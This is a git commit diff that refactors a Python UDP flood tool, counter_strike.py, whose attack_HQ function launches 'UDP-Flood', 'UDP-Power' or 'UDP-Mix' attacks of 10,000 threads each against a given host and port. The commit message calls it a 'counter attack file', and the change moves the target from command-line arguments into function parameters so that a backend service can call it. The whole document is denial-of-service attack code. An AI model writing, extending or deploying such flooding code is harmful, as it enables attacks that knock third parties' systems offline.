1e4047cba5af349caa85087e3bd8510472172c14
scottwang <hanqing.a350@gmail.com>
2025-04-16 13:13:01 -0700

    counter attack file

--- backend/app/services/counter_strike.py
+++ backend/app/services/counter_strike.py
@@ -3,14 +3,14 @@ import socket
 import threading
 #import time as clock
 
-host = str(sys.argv[1])
-port = int(sys.argv[2])
-#time = int(sys.argv[4])
-method = str(sys.argv[3])
+# host = str(sys.argv[1])
+# port = int(sys.argv[2])
+# #time = int(sys.argv[4])
+# method = str(sys.argv[3])
 
 loops = 10000
 
-def send_packet(amplifier):
+def send_packet(amplifier, host, port):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -23,16 +23,16 @@ def send_packet(amplifier):
 #        if clock.time() > timeout: exit()
 #        if clock.time() < timeout: clock.sleep(0.1)
 
-def attack_HQ():
+def attack_HQ(method, host, port):
     #timeout = clock.time() + time
     #timer(timeout)
     if method == "UDP-Flood":
         for sequence in range(loops):
-            threading.Thread(target=send_packet(375), daemon=True).start()
+            threading.Thread(target=send_packet(375, host, port), daemon=True).start()
     if method == "UDP-Power":
         for sequence in range(loops):
-            threading.Thread(target=send_packet(750), daemon=True).start()
+            threading.Thread(target=send_packet(750, host, port), daemon=True).start()
     if method == "UDP-Mix":
         for sequence in range(loops):
-            threading.Thread(target=send_packet(375), daemon=True).start()
-            threading.Thread(target=send_packet(750), daemon=True).start()
+            threading.Thread(target=send_packet(375, host, port), daemon=True).start()
+            threading.Thread(target=send_packet(750, host, port), daemon=True).start()
